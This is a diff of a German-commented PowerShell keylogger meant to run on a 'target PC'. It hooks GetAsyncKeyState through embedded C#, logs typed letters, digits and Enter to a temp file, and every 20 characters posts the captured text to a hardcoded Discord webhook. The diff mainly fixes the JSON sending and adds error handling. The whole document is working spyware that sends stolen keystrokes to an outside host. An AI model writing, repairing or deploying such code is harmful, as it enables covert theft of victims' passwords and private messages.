@@ -1,13 +1,17 @@
 $webhookUrl = "https://discord.com/api/webhooks/1491835548384624771/Ctl5jEJOKGH2VODXsix4B_LxlUPjwrawgF51OGTc9S19SlFDEyVhQHoHuC16VljzCrL5"
 
-# 2. START-MELDUNG (Damit du weißt, dass es läuft)
-$startMsg = @{ content = "✅ Keylogger auf dem Ziel-PC gestartet!" } | ConvertTo-Json
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $startMsg -ContentType "application/json"
+# 2. START-MELDUNG (Mit Fix für den JSON-Fehler)
+$msgBody = @{ content = "✅ Keylogger gestartet und bereit!" } | ConvertTo-Json -Compress
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $msgBody -ContentType "application/json; charset=utf-8"
+} catch {
+    # Falls es hier schon kracht, stimmt die URL nicht
+}
 
 $LogPath = "$env:TEMP\log.txt"
-if (Test-Path $LogPath) { Remove-Item $LogPath } # Alten Log löschen
+if (Test-Path $LogPath) { Remove-Item $LogPath }
 
-# 3. DIE SCHNITTSTELLE ZUR TASTATUR
+# 3. TASTATUR-FUNKTION
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -17,51 +21,46 @@ public class Keylogger {
 }
 "@
 
-$lastKeys = @{} # Speicher für gedrückte Tasten (Tastensperre)
+$lastKeys = @{}
 
-# 4. DER HAUPT-LOOP
+# 4. HAUPT-LOOP
 while ($true) {
-    Start-Sleep -Milliseconds 10 # CPU entlasten
+    Start-Sleep -Milliseconds 10
     
-    # Wir prüfen die Tasten von 8 (Backspace) bis 190 (Punkt/Sonderzeichen)
     for ($i = 8; $i -le 190; $i++) {
         $state = [Keylogger]::GetAsyncKeyState($i)
         
-        # Ist die Taste gerade gedrückt?
         if ($state -and 0x8000) {
-            # Nur registrieren, wenn sie vorher NICHT gedrückt war
             if (-not $lastKeys[$i]) {
                 $lastKeys[$i] = $true
                 
-                # Nur Buchstaben, Zahlen und Leerzeichen loggen (verhindert viele Quadrate)
+                # Filter für Buchstaben, Zahlen und Leerzeichen
                 if (($i -ge 48 -and $i -le 90) -or ($i -eq 32)) {
                     $key = [char]$i
                     $key | Out-File -FilePath $LogPath -Append -NoNewline
                 }
-                # Sonderfall: Enter-Taste
                 elseif ($i -eq 13) {
                     " [ENTER] " | Out-File -FilePath $LogPath -Append -NoNewline
                 }
             }
         } 
         else {
-            # Taste wurde losgelassen, wieder freigeben
             $lastKeys[$i] = $false
         }
     }
 
-    # 5. DATEN AN DISCORD SENDEN (alle 20 Zeichen)
+    # 5. DATEN SENDEN (Wenn 20 Zeichen erreicht sind)
     if (Test-Path $LogPath) {
         if ((Get-Item $LogPath).Length -gt 20) {
             $content = Get-Content $LogPath -Raw
-            $payload = @{ content = "⌨️ Getippt: $content" } | ConvertTo-Json
+            $payload = @{ content = "⌨️ Getippt: $content" } | ConvertTo-Json -Compress
             try {
-                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json; charset=utf-8"
                 Clear-Content $LogPath
             } catch {
-                # Falls Discord blockt, warten wir kurz
                 Start-Sleep -Seconds 5
             }
         }
     }
+}
 }
